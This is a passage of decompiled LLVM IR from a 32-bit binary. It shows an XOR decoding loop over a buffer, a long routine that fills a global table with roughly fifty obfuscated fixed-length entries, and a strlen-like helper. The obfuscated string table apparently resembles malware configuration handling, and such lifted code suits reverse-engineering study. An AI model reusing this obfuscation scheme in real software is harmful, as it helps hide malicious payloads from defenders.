  %v5_8051cbe = trunc i32 %v2_8051cb8 to i8
  store i8 %v5_8051cbe, i8* %stack_var_-44, align 1
  %v2_8051cc1 = udiv i32 %v1_8051ca4, 65536
  store i32 %v2_8051cc1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051cc4

dec_label_pc_8051cc4:                             ; preds = %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, %dec_label_pc_8051cb0
  %v0_8051cca = phi i32 [ %v0_8051cca.pre, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge ], [ %v1_8051ca4, %dec_label_pc_8051cb0 ]
  %v0_8051cc6 = phi i32 [ %v1_8051cf6, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge ], [ 0, %dec_label_pc_8051cb0 ]
  %v0_8051cc4 = phi i32 [ %v0_8051cee, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge ], [ %v2_8051c9d, %dec_label_pc_8051cb0 ]
  %v1_8051cc4 = inttoptr i32 %v0_8051cc4 to i32*
  %v2_8051cc4 = load i32, i32* %v1_8051cc4, align 4
  %v2_8051cc8 = add i32 %v2_8051cc4, %v0_8051cc6
  %v1_8051ccc = inttoptr i32 %v2_8051cc8 to i8*
  %v2_8051ccc = load i8, i8* %v1_8051ccc, align 1
  %v4_8051ccc = trunc i32 %v0_8051cca to i8
  %v5_8051ccc = xor i8 %v2_8051ccc, %v4_8051ccc
  store i8 %v5_8051ccc, i8* %v1_8051ccc, align 1
  %v0_8051cce = load i32, i32* %edx.global-to-local, align 4
  %v0_8051cd0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051cd0 = inttoptr i32 %v0_8051cd0 to i32*
  %v2_8051cd0 = load i32, i32* %v1_8051cd0, align 4
  %v2_8051cd2 = add i32 %v2_8051cd0, %v0_8051cce
  %v0_8051cd4 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051cd6 = inttoptr i32 %v2_8051cd2 to i8*
  %v2_8051cd6 = load i8, i8* %v1_8051cd6, align 1
  %v4_8051cd6 = trunc i32 %v0_8051cd4 to i8
  %v5_8051cd6 = xor i8 %v2_8051cd6, %v4_8051cd6
  store i8 %v5_8051cd6, i8* %v1_8051cd6, align 1
  %v0_8051cd8 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051cda = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051cda = inttoptr i32 %v0_8051cda to i32*
  %v2_8051cda = load i32, i32* %v1_8051cda, align 4
  %v2_8051cdc = add i32 %v2_8051cda, %v0_8051cd8
  %v0_8051cde = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ce0 = inttoptr i32 %v2_8051cdc to i8*
  %v2_8051ce0 = load i8, i8* %v1_8051ce0, align 1
  %v4_8051ce0 = trunc i32 %v0_8051cde to i8
  %v5_8051ce0 = xor i8 %v2_8051ce0, %v4_8051ce0
  store i8 %v5_8051ce0, i8* %v1_8051ce0, align 1
  %v0_8051ce2 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051ce4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051ce4 = inttoptr i32 %v0_8051ce4 to i32*
  %v2_8051ce4 = load i32, i32* %v1_8051ce4, align 4
  %v1_8051ce6 = add i32 %v0_8051ce2, 1
  store i32 %v1_8051ce6, i32* %edx.global-to-local, align 4
  %v2_8051ce7 = add i32 %v2_8051ce4, %v0_8051ce2
  %v2_8051ce9 = load i8, i8* %stack_var_-44, align 1
  %v1_8051cec = inttoptr i32 %v2_8051ce7 to i8*
  %v2_8051cec = load i8, i8* %v1_8051cec, align 1
  %v5_8051cec = xor i8 %v2_8051cec, %v2_8051ce9
  store i8 %v5_8051cec, i8* %v1_8051cec, align 1
  %v0_8051cee = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051cee = add i32 %v0_8051cee, 4
  %v2_8051cee = inttoptr i32 %v1_8051cee to i32*
  %v3_8051cee = load i32, i32* %v2_8051cee, align 4
  %v1_8051cf1 = urem i32 %v3_8051cee, 65536
  %v1_8051cf6 = load i32, i32* %edx.global-to-local, align 4
  %v8_8051cf8 = icmp sgt i32 %v1_8051cf1, %v1_8051cf6
  br i1 %v8_8051cf8, label %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, label %dec_label_pc_8051cfa.loopexit

dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge: ; preds = %dec_label_pc_8051cc4
  %v0_8051cca.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051cc4

dec_label_pc_8051cfa.loopexit:                    ; preds = %dec_label_pc_8051cc4
  br label %dec_label_pc_8051cfa

dec_label_pc_8051cfa:                             ; preds = %dec_label_pc_8051cfa.loopexit, %dec_label_pc_8051c90
  %v0_8051d01 = phi i32 [ %v1_8051cf1, %dec_label_pc_8051cfa.loopexit ], [ %v1_8051ca4, %dec_label_pc_8051c90 ]
  ret i32 %v0_8051d01

; uselistorder directives
  uselistorder i32 %v1_8051cf6, { 1, 0 }
  uselistorder i32 %v1_8051cf1, { 1, 0 }
  uselistorder i32 %v0_8051cee, { 1, 0 }
  uselistorder i32 %v1_8051ca4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8057320.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_805719c.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8057320.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8051d10() local_unnamed_addr {
dec_label_pc_8051d10:
  %v1_8051d16 = call i32 @function_8053514(i32 12)
  store i32 %v1_8051d16, i32* @ebx, align 4
  %v4_8051d28 = call i32 @function_8052640(i32 %v1_8051d16, i32 ptrtoint ([13 x i8]* @global_var_80556e4.54 to i32), i32 12)
  %v0_8051d2d = load i32, i32* @ebx, align 4
  store i32 %v0_8051d2d, i32* @global_var_8057338.55, align 8
  store i16 12, i16* bitcast (i32* @global_var_805733c.56 to i16*), align 4
  %v1_8051d43 = call i32 @function_8053514(i32 2)
  store i32 %v1_8051d43, i32* @ebx, align 4
  %v4_8051d55 = call i32 @function_8052640(i32 %v1_8051d43, i32 ptrtoint (i32* @global_var_80556f1.57 to i32), i32 2)
  %v0_8051d5a = load i32, i32* @ebx, align 4
  store i32 %v0_8051d5a, i32* @global_var_8057340.58, align 64
  store i16 2, i16* bitcast (i32* @global_var_8057344.59 to i16*), align 4
  %v1_8051d70 = call i32 @function_8053514(i32 12)
  store i32 %v1_8051d70, i32* @ebx, align 4
  %v4_8051d82 = call i32 @function_8052640(i32 %v1_8051d70, i32 ptrtoint ([13 x i8]* @global_var_80556e4.54 to i32), i32 12)
  %v0_8051d87 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d87, i32* @global_var_80573b0.60, align 16
  store i16 12, i16* bitcast (i32* @global_var_80573b4.61 to i16*), align 4
  %v1_8051d9d = call i32 @function_8053514(i32 2)
  store i32 %v1_8051d9d, i32* @ebx, align 4
  %v4_8051daf = call i32 @function_8052640(i32 %v1_8051d9d, i32 ptrtoint (i32* @global_var_80556f4.62 to i32), i32 2)
  %v0_8051db4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051db4, i32* @global_var_80573b8.63, align 8
  store i16 2, i16* bitcast (i32* @global_var_80573bc.64 to i16*), align 4
  %v1_8051dca = call i32 @function_8053514(i32 15)
  store i32 %v1_8051dca, i32* @ebx, align 4
  %v4_8051ddc = call i32 @function_8052640(i32 %v1_8051dca, i32 ptrtoint (i32* @global_var_80556f7.65 to i32), i32 15)
  %v0_8051de1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051de1, i32* @global_var_8057330.66, align 16
  store i16 15, i16* bitcast (i32* @global_var_8057334.67 to i16*), align 4
  %v1_8051df7 = call i32 @function_8053514(i32 29)
  store i32 %v1_8051df7, i32* @ebx, align 4
  %v4_8051e09 = call i32 @function_8052640(i32 %v1_8051df7, i32 ptrtoint (i32* @global_var_8055707.68 to i32), i32 29)
  %v0_8051e0e = load i32, i32* @ebx, align 4
  store i32 %v0_8051e0e, i32* @global_var_8057348.69, align 8
  store i16 29, i16* bitcast (i32* @global_var_805734c.70 to i16*), align 4
  %v1_8051e24 = call i32 @function_8053514(i32 7)
  store i32 %v1_8051e24, i32* @ebx, align 4
  %v4_8051e36 = call i32 @function_8052640(i32 %v1_8051e24, i32 ptrtoint ([8 x i8]* @global_var_8055725.71 to i32), i32 7)
  %v0_8051e3b = load i32, i32* @ebx, align 4
  store i32 %v0_8051e3b, i32* @global_var_8057350.72, align 16
  store i16 7, i16* bitcast (i32* @global_var_8057354.73 to i16*), align 4
  %v1_8051e51 = call i32 @function_8053514(i32 5)
  store i32 %v1_8051e51, i32* @ebx, align 4
  %v4_8051e63 = call i32 @function_8052640(i32 %v1_8051e51, i32 ptrtoint ([6 x i8]* @global_var_805572d.74 to i32), i32 5)
  %v0_8051e68 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e68, i32* @global_var_8057358.75, align 8
  store i16 5, i16* bitcast (i32* @global_var_805735c.76 to i16*), align 4
  %v1_8051e7e = call i32 @function_8053514(i32 11)
  store i32 %v1_8051e7e, i32* @ebx, align 4
  %v4_8051e90 = call i32 @function_8052640(i32 %v1_8051e7e, i32 ptrtoint (i32* @global_var_8055733.77 to i32), i32 11)
  %v0_8051e95 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e95, i32* @global_var_8057360.78, align 32
  store i16 11, i16* bitcast (i32* @global_var_8057364.79 to i16*), align 4
  %v1_8051eab = call i32 @function_8053514(i32 4)
  store i32 %v1_8051eab, i32* @ebx, align 4
  %v4_8051ebd = call i32 @function_8052640(i32 %v1_8051eab, i32 ptrtoint ([5 x i8]* @global_var_805573f.80 to i32), i32 4)
  %v0_8051ec2 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ec2, i32* @global_var_8057368.81, align 8
  store i16 4, i16* bitcast (i32* @global_var_805736c.82 to i16*), align 4
  %v1_8051ed8 = call i32 @function_8053514(i32 7)
  store i32 %v1_8051ed8, i32* @ebx, align 4
  %v4_8051eea = call i32 @function_8052640(i32 %v1_8051ed8, i32 ptrtoint ([8 x i8]* @global_var_8055744.83 to i32), i32 7)
  %v0_8051eef = load i32, i32* @ebx, align 4
  store i32 %v0_8051eef, i32* @global_var_8057370.84, align 16
  store i16 7, i16* bitcast (i32* @global_var_8057374.85 to i16*), align 4
  %v1_8051f05 = call i32 @function_8053514(i32 8)
  store i32 %v1_8051f05, i32* @ebx, align 4
  %v4_8051f17 = call i32 @function_8052640(i32 %v1_8051f05, i32 ptrtoint ([9 x i8]* @global_var_805574c.86 to i32), i32 8)
  %v0_8051f1c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f1c, i32* @global_var_8057378.87, align 8
  store i16 8, i16* bitcast (i32* @global_var_805737c.88 to i16*), align 4
  %v1_8051f32 = call i32 @function_8053514(i32 13)
  store i32 %v1_8051f32, i32* @ebx, align 4
  %v4_8051f44 = call i32 @function_8052640(i32 %v1_8051f32, i32 ptrtoint (i32* @global_var_8055755.89 to i32), i32 13)
  %v0_8051f49 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f49, i32* @global_var_8057380.90, align 128
  store i16 13, i16* bitcast (i32* @global_var_8057384.91 to i16*), align 4
  %v1_8051f5f = call i32 @function_8053514(i32 10)
  store i32 %v1_8051f5f, i32* @ebx, align 4
  %v4_8051f71 = call i32 @function_8052640(i32 %v1_8051f5f, i32 ptrtoint ([11 x i8]* @global_var_8055763.92 to i32), i32 10)
  %v0_8051f76 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f76, i32* @global_var_8057388.93, align 8
  store i16 10, i16* bitcast (i32* @global_var_805738c.94 to i16*), align 4
  %v1_8051f8c = call i32 @function_8053514(i32 10)
  store i32 %v1_8051f8c, i32* @ebx, align 4
  %v4_8051f9e = call i32 @function_8052640(i32 %v1_8051f8c, i32 ptrtoint ([11 x i8]* @global_var_805576e.95 to i32), i32 10)
  %v0_8051fa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fa3, i32* @global_var_8057390.96, align 16
  store i16 10, i16* bitcast (i32* @global_var_8057394.97 to i16*), align 4
  %v1_8051fb9 = call i32 @function_8053514(i32 33)
  store i32 %v1_8051fb9, i32* @ebx, align 4
  %v4_8051fcb = call i32 @function_8052640(i32 %v1_8051fb9, i32 ptrtoint (i32* @global_var_80558ec.98 to i32), i32 33)
  %v0_8051fd0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fd0, i32* @global_var_8057398.99, align 8
  store i16 33, i16* bitcast (i32* @global_var_805739c.100 to i16*), align 4
  %v1_8051fe6 = call i32 @function_8053514(i32 8)
  store i32 %v1_8051fe6, i32* @ebx, align 4
  %v4_8051ff8 = call i32 @function_8052640(i32 %v1_8051fe6, i32 ptrtoint ([9 x i8]* @global_var_8055779.101 to i32), i32 8)
  %v0_8051ffd = load i32, i32* @ebx, align 4
  store i32 %v0_8051ffd, i32* @global_var_80573a0.102, align 32
  store i16 8, i16* bitcast (i32* @global_var_80573a4.103 to i16*), align 4
  %v1_8052013 = call i32 @function_8053514(i32 11)
  store i32 %v1_8052013, i32* @ebx, align 4
  %v4_8052025 = call i32 @function_8052640(i32 %v1_8052013, i32 ptrtoint ([12 x i8]* @global_var_8055782.104 to i32), i32 11)
  %v0_805202a = load i32, i32* @ebx, align 4
  store i32 %v0_805202a, i32* @global_var_80573a8.105, align 8
  store i16 11, i16* bitcast (i32* @global_var_80573ac.106 to i16*), align 4
  %v1_8052040 = call i32 @function_8053514(i32 6)
  store i32 %v1_8052040, i32* @ebx, align 4
  %v4_8052052 = call i32 @function_8052640(i32 %v1_8052040, i32 ptrtoint ([7 x i8]* @global_var_805578e.107 to i32), i32 6)
  %v0_8052057 = load i32, i32* @ebx, align 4
  store i32 %v0_8052057, i32* @global_var_80573c0.108, align 64
  store i16 6, i16* bitcast (i32* @global_var_80573c4.109 to i16*), align 4
  %v1_805206d = call i32 @function_8053514(i32 7)
  store i32 %v1_805206d, i32* @ebx, align 4
  %v4_805207f = call i32 @function_8052640(i32 %v1_805206d, i32 ptrtoint ([8 x i8]* @global_var_8055795.110 to i32), i32 7)
  %v0_8052084 = load i32, i32* @ebx, align 4
  store i32 %v0_8052084, i32* @global_var_80573c8.111, align 8
  store i16 7, i16* bitcast (i32* @global_var_80573cc.112 to i16*), align 4
  %v1_805209a = call i32 @function_8053514(i32 7)
  store i32 %v1_805209a, i32* @ebx, align 4
  %v4_80520ac = call i32 @function_8052640(i32 %v1_805209a, i32 ptrtoint ([8 x i8]* @global_var_805579d.113 to i32), i32 7)
  %v0_80520b1 = load i32, i32* @ebx, align 4
  store i32 %v0_80520b1, i32* @global_var_80573d0.114, align 16
  store i16 7, i16* bitcast (i32* @global_var_80573d4.115 to i16*), align 4
  %v1_80520c7 = call i32 @function_8053514(i32 3)
  store i32 %v1_80520c7, i32* @ebx, align 4
  %v4_80520d9 = call i32 @function_8052640(i32 %v1_80520c7, i32 ptrtoint ([4 x i8]* @global_var_80557a5.116 to i32), i32 3)
  %v0_80520de = load i32, i32* @ebx, align 4
  store i32 %v0_80520de, i32* @global_var_80573d8.117, align 8
  store i16 3, i16* bitcast (i32* @global_var_80573dc.118 to i16*), align 4
  %v1_80520f4 = call i32 @function_8053514(i32 19)
  store i32 %v1_80520f4, i32* @ebx, align 4
  %v4_8052106 = call i32 @function_8052640(i32 %v1_80520f4, i32 ptrtoint (i32* @global_var_80557a9.119 to i32), i32 19)
  %v0_805210b = load i32, i32* @ebx, align 4
  store i32 %v0_805210b, i32* @global_var_80573e0.120, align 32
  store i16 19, i16* bitcast (i32* @global_var_80573e4.121 to i16*), align 4
  %v1_8052121 = call i32 @function_8053514(i32 24)
  store i32 %v1_8052121, i32* @ebx, align 4
  %v4_8052133 = call i32 @function_8052640(i32 %v1_8052121, i32 ptrtoint (i32* @global_var_80557bd.122 to i32), i32 24)
  %v0_8052138 = load i32, i32* @ebx, align 4
  store i32 %v0_8052138, i32* @global_var_80573e8.123, align 8
  store i16 24, i16* bitcast (i32* @global_var_80573ec.124 to i16*), align 4
  %v1_805214e = call i32 @function_8053514(i32 9)
  store i32 %v1_805214e, i32* @ebx, align 4
  %v4_8052160 = call i32 @function_8052640(i32 %v1_805214e, i32 ptrtoint ([10 x i8]* @global_var_80557d6.125 to i32), i32 9)
  %v0_8052165 = load i32, i32* @ebx, align 4
  store i32 %v0_8052165, i32* @global_var_80573f0.126, align 16
  store i16 9, i16* bitcast (i32* @global_var_80573f4.127 to i16*), align 4
  %v1_805217b = call i32 @function_8053514(i32 16)
  store i32 %v1_805217b, i32* @ebx, align 4
  %v4_805218d = call i32 @function_8052640(i32 %v1_805217b, i32 ptrtoint (i32* @global_var_80557e0.128 to i32), i32 16)
  %v0_8052192 = load i32, i32* @ebx, align 4
  store i32 %v0_8052192, i32* @global_var_80573f8.129, align 8
  store i16 16, i16* bitcast (i32* @global_var_80573fc.130 to i16*), align 4
  %v1_80521a8 = call i32 @function_8053514(i32 22)
  store i32 %v1_80521a8, i32* @ebx, align 4
  %v4_80521ba = call i32 @function_8052640(i32 %v1_80521a8, i32 ptrtoint (i32* @global_var_80557f1.131 to i32), i32 22)
  %v0_80521bf = load i32, i32* @ebx, align 4
  store i32 %v0_80521bf, i32* @global_var_8057400.132, align 1024
  store i16 22, i16* bitcast (i32* @global_var_8057404.133 to i16*), align 4
  %v1_80521d5 = call i32 @function_8053514(i32 21)
  store i32 %v1_80521d5, i32* @ebx, align 4
  %v4_80521e7 = call i32 @function_8052640(i32 %v1_80521d5, i32 ptrtoint (i32* @global_var_8055808.134 to i32), i32 21)
  %v0_80521ec = load i32, i32* @ebx, align 4
  store i32 %v0_80521ec, i32* @global_var_8057408.135, align 8
  store i16 21, i16* bitcast (i32* @global_var_805740c.136 to i16*), align 4
  %v1_8052202 = call i32 @function_8053514(i32 17)
  store i32 %v1_8052202, i32* @ebx, align 4
  %v4_8052214 = call i32 @function_8052640(i32 %v1_8052202, i32 ptrtoint ([18 x i8]* @global_var_805581e.137 to i32), i32 17)
  %v0_8052219 = load i32, i32* @ebx, align 4
  store i32 %v0_8052219, i32* @global_var_8057410.138, align 16
  store i16 17, i16* bitcast (i32* @global_var_8057414.139 to i16*), align 4
  %v1_805222f = call i32 @function_8053514(i32 12)
  store i32 %v1_805222f, i32* @ebx, align 4
  %v4_8052241 = call i32 @function_8052640(i32 %v1_805222f, i32 ptrtoint (i32* @global_var_8055830.140 to i32), i32 12)
  %v0_8052246 = load i32, i32* @ebx, align 4
  store i32 %v0_8052246, i32* @global_var_8057418.141, align 8
  store i16 12, i16* bitcast (i32* @global_var_805741c.142 to i16*), align 4
  %v1_805225c = call i32 @function_8053514(i32 23)
  store i32 %v1_805225c, i32* @ebx, align 4
  %v4_805226e = call i32 @function_8052640(i32 %v1_805225c, i32 ptrtoint (i32* @global_var_805583d.143 to i32), i32 23)
  %v0_8052273 = load i32, i32* @ebx, align 4
  store i32 %v0_8052273, i32* @global_var_8057420.144, align 32
  store i16 23, i16* bitcast (i32* @global_var_8057424.145 to i16*), align 4
  %v1_8052289 = call i32 @function_8053514(i32 83)
  store i32 %v1_8052289, i32* @ebx, align 4
  %v4_805229b = call i32 @function_8052640(i32 %v1_8052289, i32 ptrtoint (i32* @global_var_8055910.146 to i32), i32 83)
  %v0_80522a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80522a0, i32* @global_var_8057428.147, align 8
  store i16 83, i16* bitcast (i32* @global_var_805742c.148 to i16*), align 4
  %v1_80522b6 = call i32 @function_8053514(i32 32)
  store i32 %v1_80522b6, i32* @ebx, align 4
  %v4_80522c8 = call i32 @function_8052640(i32 %v1_80522b6, i32 ptrtoint (i32* @global_var_8055964.149 to i32), i32 32)
  %v0_80522cd = load i32, i32* @ebx, align 4
  store i32 %v0_80522cd, i32* @global_var_8057430.150, align 16
  store i16 32, i16* bitcast (i32* @global_var_8057434.151 to i16*), align 4
  %v1_80522e3 = call i32 @function_8053514(i32 48)
  store i32 %v1_80522e3, i32* @ebx, align 4
  %v4_80522f5 = call i32 @function_8052640(i32 %v1_80522e3, i32 ptrtoint (i32* @global_var_8055988.152 to i32), i32 48)
  %v0_80522fa = load i32, i32* @ebx, align 4
  store i32 %v0_80522fa, i32* @global_var_8057438.153, align 8
  store i16 48, i16* bitcast (i32* @global_var_805743c.154 to i16*), align 4
  %v1_8052310 = call i32 @function_8053514(i32 12)
  store i32 %v1_8052310, i32* @ebx, align 4
  %v4_8052322 = call i32 @function_8052640(i32 %v1_8052310, i32 ptrtoint (i32* @global_var_8055855.155 to i32), i32 12)
  %v0_8052327 = load i32, i32* @ebx, align 4
  store i32 %v0_8052327, i32* @global_var_8057440.156, align 64
  store i16 12, i16* bitcast (i32* @global_var_8057444.157 to i16*), align 4
  %v1_805233d = call i32 @function_8053514(i32 9)
  store i32 %v1_805233d, i32* @ebx, align 4
  %v4_805234f = call i32 @function_8052640(i32 %v1_805233d, i32 ptrtoint (i32* @global_var_8055862.158 to i32), i32 9)
  %v0_8052354 = load i32, i32* @ebx, align 4
  store i32 %v0_8052354, i32* @global_var_8057448.159, align 8
  store i16 9, i16* bitcast (i32* @global_var_805744c.160 to i16*), align 4
  %v1_805236a = call i32 @function_8053514(i32 10)
  store i32 %v1_805236a, i32* @ebx, align 4
  %v4_805237c = call i32 @function_8052640(i32 %v1_805236a, i32 ptrtoint (i32* @global_var_805586c.161 to i32), i32 10)
  %v0_8052381 = load i32, i32* @ebx, align 4
  store i32 %v0_8052381, i32* @global_var_8057450.162, align 16
  store i16 10, i16* bitcast (i32* @global_var_8057454.163 to i16*), align 4
  %v1_8052397 = call i32 @function_8053514(i32 12)
  store i32 %v1_8052397, i32* @ebx, align 4
  %v4_80523a9 = call i32 @function_8052640(i32 %v1_8052397, i32 ptrtoint (i32* @global_var_8055877.164 to i32), i32 12)
  %v0_80523ae = load i32, i32* @ebx, align 4
  store i32 %v0_80523ae, i32* @global_var_8057458.165, align 8
  store i16 12, i16* bitcast (i32* @global_var_805745c.166 to i16*), align 4
  %v1_80523c4 = call i32 @function_8053514(i32 16)
  store i32 %v1_80523c4, i32* @ebx, align 4
  %v4_80523d6 = call i32 @function_8052640(i32 %v1_80523c4, i32 ptrtoint (i32* @global_var_8055884.167 to i32), i32 16)
  %v0_80523db = load i32, i32* @ebx, align 4
  store i32 %v0_80523db, i32* @global_var_8057460.168, align 32
  store i16 16, i16* bitcast (i32* @global_var_8057464.169 to i16*), align 4
  %v1_80523f1 = call i32 @function_8053514(i32 19)
  store i32 %v1_80523f1, i32* @ebx, align 4
  %v4_8052403 = call i32 @function_8052640(i32 %v1_80523f1, i32 ptrtoint (i32* @global_var_8055895.170 to i32), i32 19)
  %v0_8052408 = load i32, i32* @ebx, align 4
  store i32 %v0_8052408, i32* @global_var_8057468.171, align 8
  store i16 19, i16* bitcast (i32* @global_var_805746c.172 to i16*), align 4
  %v1_805241e = call i32 @function_8053514(i32 8)
  store i32 %v1_805241e, i32* @ebx, align 4
  %v4_8052430 = call i32 @function_8052640(i32 %v1_805241e, i32 ptrtoint ([9 x i8]* @global_var_80558a9.173 to i32), i32 8)
  %v0_8052435 = load i32, i32* @ebx, align 4
  store i32 %v0_8052435, i32* @global_var_8057470.174, align 16
  store i16 8, i16* bitcast (i32* @global_var_8057474.175 to i16*), align 4
  %v1_805244b = call i32 @function_8053514(i32 11)
  store i32 %v1_805244b, i32* @ebx, align 4
  %v4_805245d = call i32 @function_8052640(i32 %v1_805244b, i32 ptrtoint (i32* @global_var_8055849.176 to i32), i32 11)
  %v0_8052462 = load i32, i32* @ebx, align 4
  store i32 %v0_8052462, i32* @global_var_8057478.177, align 8
  store i16 11, i16* bitcast (i32* @global_var_805747c.178 to i16*), align 4
  %v1_8052478 = call i32 @function_8053514(i32 12)
  store i32 %v1_8052478, i32* @ebx, align 4
  %v4_805248a = call i32 @function_8052640(i32 %v1_8052478, i32 ptrtoint (i32* @global_var_80558b2.179 to i32), i32 12)
  %v0_805248f = load i32, i32* @ebx, align 4
  store i32 %v0_805248f, i32* @global_var_8057480.180, align 128
  store i16 12, i16* bitcast (i32* @global_var_8057484.181 to i16*), align 4
  %v1_80524a5 = call i32 @function_8053514(i32 18)
  store i32 %v1_80524a5, i32* @ebx, align 4
  %v4_80524b7 = call i32 @function_8052640(i32 %v1_80524a5, i32 ptrtoint (i32* @global_var_80558bf.182 to i32), i32 18)
  %v0_80524bc = load i32, i32* @ebx, align 4
  store i32 %v0_80524bc, i32* @global_var_8057488.183, align 8
  store i16 18, i16* bitcast (i32* @global_var_805748c.184 to i16*), align 4
  %v1_80524d2 = call i32 @function_8053514(i32 25)
  store i32 %v1_80524d2, i32* @ebx, align 4
  %v4_80524e4 = call i32 @function_8052640(i32 %v1_80524d2, i32 ptrtoint (i32* @global_var_80558d2.185 to i32), i32 25)
  %v0_80524e9 = load i32, i32* @ebx, align 4
  store i32 %v0_80524e9, i32* @global_var_8057490.186, align 16
  store i16 25, i16* bitcast (i32* @global_var_8057494.187 to i16*), align 4
  %v1_80524ff = call i32 @function_8053514(i32 111)
  store i32 %v1_80524ff, i32* @ebx, align 4
  %v4_8052511 = call i32 @function_8052640(i32 %v1_80524ff, i32 ptrtoint (i32* @global_var_80559bc.188 to i32), i32 111)
  %v0_8052516 = load i32, i32* @ebx, align 4
  store i32 %v0_8052516, i32* @global_var_8057498.189, align 8
  store i16 111, i16* bitcast (i32* @global_var_805749c.190 to i16*), align 4
  %v1_805252c = call i32 @function_8053514(i32 111)
  store i32 %v1_805252c, i32* @ebx, align 4
  %v4_805253e = call i32 @function_8052640(i32 %v1_805252c, i32 ptrtoint (i32* @global_var_8055a2c.191 to i32), i32 111)
  %v0_8052543 = load i32, i32* @ebx, align 4
  store i32 %v0_8052543, i32* @global_var_80574a0.192, align 32
  store i16 111, i16* bitcast (i32* @global_var_80574a4.193 to i16*), align 4
  %v1_8052559 = call i32 @function_8053514(i32 110)
  store i32 %v1_8052559, i32* @ebx, align 4
  %v4_805256b = call i32 @function_8052640(i32 %v1_8052559, i32 ptrtoint (i32* @global_var_8055a9c.194 to i32), i32 110)
  %v0_8052570 = load i32, i32* @ebx, align 4
  store i32 %v0_8052570, i32* @global_var_80574a8.195, align 8
  store i16 110, i16* bitcast (i32* @global_var_80574ac.196 to i16*), align 4
  %v1_8052586 = call i32 @function_8053514(i32 110)
  store i32 %v1_8052586, i32* @ebx, align 4
  %v4_8052598 = call i32 @function_8052640(i32 %v1_8052586, i32 ptrtoint (i32* @global_var_8055b0c.197 to i32), i32 110)
  %v0_805259d = load i32, i32* @ebx, align 4
  store i32 %v0_805259d, i32* @global_var_80574b0.198, align 16
  store i16 110, i16* bitcast (i32* @global_var_80574b4.199 to i16*), align 4
  %v1_80525b3 = call i32 @function_8053514(i32 117)
  store i32 %v1_80525b3, i32* @ebx, align 4
  %v4_80525c5 = call i32 @function_8052640(i32 %v1_80525b3, i32 ptrtoint (i32* @global_var_8055b7c.200 to i32), i32 117)
  %v0_80525ca = load i32, i32* @ebx, align 4
  store i32 %v0_80525ca, i32* @global_var_80574b8.201, align 8
  store i16 117, i16* bitcast (i32* @global_var_80574bc.202 to i16*), align 4
  ret i32 %v4_80525c5

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8052640, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_80525e0(i8* %arg1) local_unnamed_addr {
dec_label_pc_80525e0:
  %v4_80525e0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80525e0, i32* @edx, align 4
  %v2_80525e6 = load i8, i8* %arg1, align 1
  %v3_80525e6 = icmp eq i8 %v2_80525e6, 0
  br i1 %v3_80525e6, label %dec_label_pc_80525f7, label %dec_label_pc_80525f0

dec_label_pc_80525f0:                             ; preds = %dec_label_pc_80525e0, %dec_label_pc_80525f0
  %v0_80525f0 = phi i32 [ %v1_80525f0, %dec_label_pc_80525f0 ], [ 0, %dec_label_pc_80525e0 ]
  %v1_80525f0 = add i32 %v0_80525f0, 1
  %v2_80525f1 = add i32 %v1_80525f0, %v4_80525e0
  %v3_80525f1 = inttoptr i32 %v2_80525f1 to i8*
  %v4_80525f1 = load i8, i8* %v3_80525f1, align 1
  %v5_80525f1 = icmp eq i8 %v4_80525f1, 0
  %v1_80525f5 = icmp eq i1 %v5_80525f1, false
  br i1 %v1_80525f5, label %dec_label_pc_80525f0, label %dec_label_pc_80525f7

dec_label_pc_80525f7:                             ; preds = %dec_label_pc_80525f0, %dec_label_pc_80525e0
  %v0_80525f7 = phi i32 [ 0, %dec_label_pc_80525e0 ], [ %v1_80525f0, %dec_label_pc_80525f0 ]
  ret i32 %v0_80525f7

; uselistorder directives
  uselistorder label %dec_label_pc_80525f0, { 1, 0 }
}

define i32 @function_8052600(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052600:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052601 = load i32, i32* @ebx, align 4
  store i32 %v0_8052601, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8052606 = ptrtoint i8* %arg1 to i32
